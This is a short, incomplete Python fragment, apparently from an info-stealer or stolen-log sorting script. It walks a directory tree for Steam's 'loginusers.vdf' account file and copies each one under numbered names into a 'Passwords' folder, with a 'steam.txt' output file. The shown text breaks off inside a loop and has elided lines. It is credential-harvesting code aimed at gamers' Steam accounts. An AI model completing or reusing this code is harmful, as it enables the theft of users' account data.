...
new_folder_name = os.path.join(path, 'steam.txt')
...
for foldername, subfolders, filenames in os.walk(path):
    ...
    if 'loginusers.vdf' in filenames:
        # Get the path of the Passwords.txt file
        passwords_file_path = os.path.join(foldername, 'loginusers.vdf')
        # Create a new file with a numbered suffix inside the "Passwords" folder
        i = 1
        while True:
            new_passwords_file_name = f"loginusers{i}.vdf"
